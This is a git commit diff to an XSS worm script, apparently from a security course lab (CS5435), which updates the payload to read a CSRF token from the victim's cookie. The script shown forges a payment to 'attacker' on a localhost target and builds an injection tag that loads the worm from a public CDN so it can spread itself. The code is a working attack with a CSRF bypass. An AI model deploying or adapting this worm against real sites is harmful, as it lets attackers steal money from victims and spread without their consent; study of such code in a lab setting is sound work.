5045603f34159160cebf225e54a5174131260fe0
mrajesh26 <92545815+mrajesh26@users.noreply.github.com>
2021-10-18 20:32:17 -0400

    Update xss_worm_code.js

--- xss_worm_code.js
+++ xss_worm_code.js
@@ -1,8 +1,9 @@
 var xhr = new XMLHttpRequest();
+var csrftoken= String(document.cookie).substring(8);
 xhr.open('POST', 'http://localhost:8080/pay', true);
 xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 xhr.setRequestHeader("Cookie", document.cookie);
-xhr.send('recipient=attacker&amount=1');
+xhr.send('recipient=attacker&amount=1&CSRFToken='+csrftoken);
 var infection_code = "<script type=\"text\/javascript\" src=\"https:\/\/cdn.jsdelivr.net\/gh\/mrajesh26\/CS5435-Scripts@main\/xss_worm_code.js\"> <\/script>";
 spread_worm();
 function spread_worm() {
